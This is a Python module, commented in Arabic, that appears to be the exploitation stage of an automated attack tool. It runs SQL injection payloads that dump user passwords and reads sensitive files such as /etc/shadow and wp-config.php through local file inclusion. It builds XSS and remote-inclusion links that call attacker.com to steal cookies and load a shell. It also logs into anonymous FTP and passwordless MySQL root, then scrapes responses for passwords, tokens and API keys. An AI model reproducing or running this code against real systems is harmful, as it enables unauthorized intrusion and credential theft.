#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
وحدة استغلال الثغرات الأمنية
'''

import re
import time
import random
import requests
import socket
import paramiko
import ftplib
import pymysql
from colorama import Fore, Style
from urllib.parse import urljoin, urlparse

# تعطيل تحذيرات SSL
requests.packages.urllib3.disable_warnings()

class Exploiter:
    def __init__(self, target_info, vulnerabilities, verbose=False):
        self.target = target_info['target']
        self.domain = target_info['domain']
        self.ip = target_info['ip']
        self.vulnerabilities = vulnerabilities
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        }
        self.exploited = []
    
    # الدالة الرئيسية لاستغلال الثغرات
    def run(self):
        print(f"{Fore.BLUE}[*] محاولة استغلال {len(self.vulnerabilities)} ثغرة...{Style.RESET_ALL}")
        
        for vuln in self.vulnerabilities:
            try:
                # تحديد طريقة الاستغلال المناسبة بناءً على نوع الثغرة
                if vuln['name'] == 'ثغرة حقن SQL':
                    result = self.exploit_sql_injection(vuln)
                elif vuln['name'] == 'ثغرة XSS':
                    result = self.exploit_xss(vuln)
                elif vuln['name'] == 'ثغرة تضمين الملفات المحلية (LFI)':
                    result = self.exploit_lfi(vuln)
                elif vuln['name'] == 'ثغرة تضمين الملفات البعيدة (RFI)':
                    result = self.exploit_rfi(vuln)
                elif vuln['name'] == 'وصول FTP مجهول محتمل':
                    result = self.exploit_anonymous_ftp(vuln)
                elif vuln['name'] == 'كلمة مرور MySQL فارغة محتملة':
                    result = self.exploit_mysql_empty_password(vuln)
                elif 'خدمة Telnet مفتوحة' in vuln['name']:
                    result = self.exploit_telnet(vuln)
                else:
                    # لا توجد طريقة استغلال محددة لهذه الثغرة
                    if self.verbose:
                        print(f"{Fore.YELLOW}[!] لا توجد طريقة استغلال محددة للثغرة: {vuln['name']}{Style.RESET_ALL}")
                    continue
                
                # إذا نجح الاستغلال، أضف الثغرة إلى قائمة الثغرات المستغلة
                if result:
                    self.exploited.append({
                        'vulnerability': vuln,
                        'result': result
                    })
                    print(f"{Fore.GREEN}[+] تم استغلال الثغرة بنجاح: {vuln['name']}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}[!] فشل استغلال الثغرة: {vuln['name']}{Style.RESET_ALL}")
            
            except Exception as e:
                print(f"{Fore.RED}[!] خطأ أثناء محاولة استغلال الثغرة {vuln['name']}: {str(e)}{Style.RESET_ALL}")
        
        return self.exploited
    
    # استغلال ثغرة حقن SQL
    def exploit_sql_injection(self, vuln):
        print(f"{Fore.BLUE}[*] محاولة استغلال ثغرة حقن SQL: {vuln['path']}{Style.RESET_ALL}")
        
        # قائمة بأنماط حقن SQL للاستغلال
        payloads = [
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",
            "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables --",
            "' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='users' --",
            "' UNION SELECT username,password,3,4,5 FROM users --"
        ]
        
        results = []
        for payload in payloads:
            try:
                # إنشاء عنوان URL مع الحمولة
                if '?' in vuln['path']:
                    # إضافة الحمولة إلى المعلمات الموجودة
                    parts = vuln['path'].split('?')
                    base = parts[0]
                    params = parts[1].split('&')
                    new_params = []
                    for param in params:
                        if '=' in param:
                            name, value = param.split('=', 1)
                            new_params.append(f"{name}={value}{payload}")
                        else:
                            new_params.append(param)
                    inject_url = f"{base}?{'&'.join(new_params)}"
                else:
                    # إضافة معلمة جديدة مع الحمولة
                    inject_url = f"{vuln['path']}?id={payload}"
                
                response = self.session.get(inject_url, verify=False, timeout=10)
                
                # البحث عن بيانات مثيرة للاهتمام في الاستجابة
                interesting_data = self.extract_interesting_data(response.text)
                if interesting_data:
                    results.append({
                        'payload': payload,
                        'url': inject_url,
                        'data': interesting_data
                    })
                    
                    if self.verbose:
                        print(f"{Fore.GREEN}[+] تم العثور على بيانات مثيرة للاهتمام باستخدام الحمولة: {payload}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}    البيانات: {interesting_data}{Style.RESET_ALL}")
            
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.YELLOW}[!] خطأ أثناء استغلال حقن SQL باستخدام الحمولة {payload}: {str(e)}{Style.RESET_ALL}")
        
        return results if results else None
    
    # استغلال ثغرة XSS
    def exploit_xss(self, vuln):
        print(f"{Fore.BLUE}[*] محاولة استغلال ثغرة XSS: {vuln['path']}{Style.RESET_ALL}")
        
        # في بيئة حقيقية، لا يمكن استغلال XSS بشكل مباشر بدون تفاعل المستخدم
        # هنا نقوم فقط بإنشاء رابط يمكن استخدامه في هجوم حقيقي
        
        payload = "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"
        
        try:
            # إنشاء عنوان URL مع الحمولة
            if '?' in vuln['path']:
                # إضافة الحمولة إلى المعلمات الموجودة
                parts = vuln['path'].split('?')
                base = parts[0]
                params = parts[1].split('&')
                new_params = []
                for param in params:
                    if '=' in param:
                        name, value = param.split('=', 1)
                        new_params.append(f"{name}={payload}")
                    else:
                        new_params.append(param)
                xss_url = f"{base}?{'&'.join(new_params)}"
            else:
                # إضافة معلمة جديدة مع الحمولة
                xss_url = f"{vuln['path']}?xss={payload}"
            
            return {
                'payload': payload,
                'url': xss_url,
                'note': 'تم إنشاء رابط XSS. في بيئة حقيقية، يجب إرسال هذا الرابط إلى الضحية لاستغلال الثغرة.'
            }
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] خطأ أثناء استغلال XSS: {str(e)}{Style.RESET_ALL}")
            return None
    
    # استغلال ثغرة تضمين الملفات المحلية
    def exploit_lfi(self, vuln):
        print(f"{Fore.BLUE}[*] محاولة استغلال ثغرة تضمين الملفات المحلية: {vuln['path']}{Style.RESET_ALL}")
        
        # قائمة بالملفات الحساسة للقراءة
        sensitive_files = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/etc/hostname',
            '/etc/issue',
            '/proc/self/environ',
            '/proc/self/cmdline',
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/var/www/html/config.php',
            '/var/www/html/wp-config.php',
            '/var/www/html/configuration.php',
            '/var/www/html/config.inc.php'
        ]
        
        results = []
        for file_path in sensitive_files:
            try:
                # إنشاء عنوان URL مع مسار الملف
                if '?' in vuln['path']:
                    # إضافة مسار الملف إلى المعلمات الموجودة
                    parts = vuln['path'].split('?')
                    base = parts[0]
                    params = parts[1].split('&')
                    new_params = []
                    for param in params:
                        if '=' in param:
                            name, value = param.split('=', 1)
                            new_params.append(f"{name}={file_path}")
                        else:
                            new_params.append(param)
                    lfi_url = f"{base}?{'&'.join(new_params)}"
                else:
                    # إضافة معلمة جديدة مع مسار الملف
                    lfi_url = f"{vuln['path']}?file={file_path}"
                
                response = self.session.get(lfi_url, verify=False, timeout=10)
                
                # البحث عن علامات نجاح قراءة الملف
                if 'root:x:' in response.text or 'www-data:' in response.text or 'DB_PASSWORD' in response.text:
                    file_content = response.text[:500] + '...' if len(response.text) > 500 else response.text
                    results.append({
                        'file': file_path,
                        'url': lfi_url,
                        'content': file_content
                    })
                    
                    if self.verbose:
                        print(f"{Fore.GREEN}[+] تم قراءة الملف بنجاح: {file_path}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}    المحتوى: {file_content[:100]}...{Style.RESET_ALL}")
            
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.YELLOW}[!] خطأ أثناء محاولة قراءة الملف {file_path}: {str(e)}{Style.RESET_ALL}")
        
        return results if results else None
    
    # استغلال ثغرة تضمين الملفات البعيدة
    def exploit_rfi(self, vuln):
        print(f"{Fore.BLUE}[*] محاولة استغلال ثغرة تضمين الملفات البعيدة: {vuln['path']}{Style.RESET_ALL}")
        
        # في بيئة حقيقية، يجب استضافة ملف PHP ضار على خادم يتحكم فيه المهاجم
        # هنا نقوم فقط بإنشاء رابط يمكن استخدامه في هجوم حقيقي
        
        payload = "http://attacker.com/shell.php"
        
        try:
            # إنشاء عنوان URL مع الحمولة
            if '?' in vuln['path']:
                # إضافة الحمولة إلى المعلمات الموجودة
                parts = vuln['path'].split('?')
                base = parts[0]
                params = parts[1].split('&')
                new_params = []
                for param in params:
                    if '=' in param:
                        name, value = param.split('=', 1)
                        new_params.append(f"{name}={payload}")
                    else:
                        new_params.append(param)
                rfi_url = f"{base}?{'&'.join(new_params)}"
            else:
                # إضافة معلمة جديدة مع الحمولة
                rfi_url = f"{vuln['path']}?file={payload}"
            
            return {
                'payload': payload,
                'url': rfi_url,
                'note': 'تم إنشاء رابط RFI. في بيئة حقيقية، يجب استضافة ملف PHP ضار على خادم يتحكم فيه المهاجم.'
            }
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] خطأ أثناء استغلال RFI: {str(e)}{Style.RESET_ALL}")
            return None
    
    # استغلال وصول FTP المجهول
    def exploit_anonymous_ftp(self, vuln):
        print(f"{Fore.BLUE}[*] محاولة استغلال وصول FTP المجهول: {vuln['path']}{Style.RESET_ALL}")
        
        try:
            # استخراج عنوان IP والمنفذ من مسار الثغرة
            parts = vuln['path'].split(':')
            ip = parts[0]
            port = int(parts[1]) if len(parts) > 1 else 21
            
            # محاولة الاتصال بخادم FTP باستخدام اسم المستخدم "anonymous"
            ftp = ftplib.FTP()
            ftp.connect(ip, port)
            ftp.login('anonymous', 'anonymous@example.com')
            
            # الحصول على قائمة الملفات والمجلدات
            files = []
            ftp.retrlines('LIST', lambda x: files.append(x))
            
            # إغلاق الاتصال
            ftp.quit()
            
            return {
                'success': True,
                'files': files[:10],  # عرض أول 10 ملفات فقط
                'note': 'تم الوصول إلى خادم FTP باستخدام حساب مجهول.'
            }
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] خطأ أثناء استغلال وصول FTP المجهول: {str(e)}{Style.RESET_ALL}")
            return None
    
    # استغلال كلمة مرور MySQL الفارغة
    def exploit_mysql_empty_password(self, vuln):
        print(f"{Fore.BLUE}[*] محاولة استغلال كلمة مرور MySQL الفارغة: {vuln['path']}{Style.RESET_ALL}")
        
        try:
            # استخراج عنوان IP والمنفذ من مسار الثغرة
            parts = vuln['path'].split(':')
            ip = parts[0]
            port = int(parts[1]) if len(parts) > 1 else 3306
            
            # محاولة الاتصال بخادم MySQL باستخدام كلمة مرور فارغة
            connection = pymysql.connect(
                host=ip,
                port=port,
                user='root',
                password='',
                connect_timeout=5
            )
            
            # الحصول على قائمة قواعد البيانات
            cursor = connection.cursor()
            cursor.execute('SHOW DATABASES')
            databases = [row[0] for row in cursor.fetchall()]
            
            # إغلاق الاتصال
            cursor.close()
            connection.close()
            
            return {
                'success': True,
                'databases': databases,
                'note': 'تم الوصول إلى خادم MySQL باستخدام كلمة مرور فارغة للمستخدم الجذر.'
            }
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] خطأ أثناء استغلال كلمة مرور MySQL الفارغة: {str(e)}{Style.RESET_ALL}")
            return None
    
    # استغلال خدمة Telnet
    def exploit_telnet(self, vuln):
        print(f"{Fore.BLUE}[*] محاولة استغلال خدمة Telnet: {vuln['path']}{Style.RESET_ALL}")
        
        # في بيئة حقيقية، يمكن محاولة تخمين كلمات المرور
        # هنا نقوم فقط بإنشاء ملاحظة حول إمكانية الاستغلال
        
        return {
            'note': 'تم اكتشاف خدمة Telnet مفتوحة. في بيئة حقيقية، يمكن محاولة تخمين كلمات المرور أو اعتراض الاتصالات.'
        }
    
    # استخراج بيانات مثيرة للاهتمام من النص
    def extract_interesting_data(self, text):
        interesting_data = []
        
        # البحث عن أسماء المستخدمين وكلمات المرور
        usernames = re.findall(r'username[\s"\']*[:=][\s"\']*([^\s"\',;<>]+)', text, re.IGNORECASE)
        passwords = re.findall(r'password[\s"\']*[:=][\s"\']*([^\s"\',;<>]+)', text, re.IGNORECASE)
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)
        tokens = re.findall(r'token[\s"\']*[:=][\s"\']*([^\s"\',;<>]+)', text, re.IGNORECASE)
        api_keys = re.findall(r'api[_-]?key[\s"\']*[:=][\s"\']*([^\s"\',;<>]+)', text, re.IGNORECASE)
        
        if usernames:
            interesting_data.append({'type': 'usernames', 'data': usernames[:5]})
        if passwords:
            interesting_data.append({'type': 'passwords', 'data': passwords[:5]})
        if emails:
            interesting_data.append({'type': 'emails', 'data': emails[:5]})
        if tokens:
            interesting_data.append({'type': 'tokens', 'data': tokens[:5]})
        if api_keys:
            interesting_data.append({'type': 'api_keys', 'data': api_keys[:5]})
        
        return interesting_data if interesting_data else None